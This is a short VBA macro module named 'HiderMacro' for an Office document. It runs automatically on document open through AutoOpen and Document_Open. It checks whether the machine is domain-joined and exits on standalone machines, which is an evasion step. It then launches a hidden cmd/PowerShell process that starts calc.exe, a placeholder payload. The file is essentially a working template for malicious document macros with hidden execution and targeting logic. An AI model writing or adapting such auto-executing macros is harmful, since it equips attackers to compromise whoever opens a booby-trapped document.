Attribute VB_Name = "HiderMacro"

Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    On Error Resume Next

            
                Set objNetwork = CreateObject("WScript.Network")
                If objNetwork.UserDomain = objNetwork.ComputerName Then Exit Sub
            
            
            ' Execution
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run "cmd /c powershell -c Start-Process calc.exe", 0, True
        
End Sub
